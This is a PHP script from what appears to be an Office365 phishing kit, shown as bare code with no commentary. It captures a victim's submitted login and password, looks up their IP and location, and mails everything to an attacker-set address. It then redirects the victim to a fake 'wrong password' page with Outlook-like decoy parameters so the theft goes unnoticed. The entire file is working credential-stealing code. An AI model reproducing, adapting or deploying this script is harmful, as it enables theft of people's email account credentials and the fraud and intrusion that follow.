﻿<?php 
require '../forward.php';
$browser = $_SERVER['HTTP_USER_AGENT'];

require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();

//get user's ip address 
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 
$xemail = $_POST['login'];
$email =  bin2hex($xemail);
$from_email = "KEYWORD";
$headers = "From: " . $from_email;
$message .= "START LOG:\n";
$message .= "Office365 ID: " . $_POST['login'] . "\n"; 
$message .= "Password: " . $_POST['passwd'] . "\n"; 
$message .= "LOCATION (".$ip.",{$geoplugin->countryName},{$geoplugin->countryCode},{$geoplugin->city},{$geoplugin->region})\n";
$to = EMAIL; 


$hi = mail($to,$emailprovider."Office365 ".$ip , $message,$headers);
	?> 
<script type="text/javascript"> 
<!-- 
   window.location="wrong_pass.php?email=<?php echo $email ?>&rand=13InboxLightaspxn.1774256418&fid.4.1252899642&fid=1&fav.1&rand.13InboxLight.aspxn.1774256418&fid.1252899642&fid.1&fav.113InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1"

</script> 
<?php	

  ?> 
<script type="text/javascript">

</script> 
<?php	
fclose($handle); 
exit; 
?> 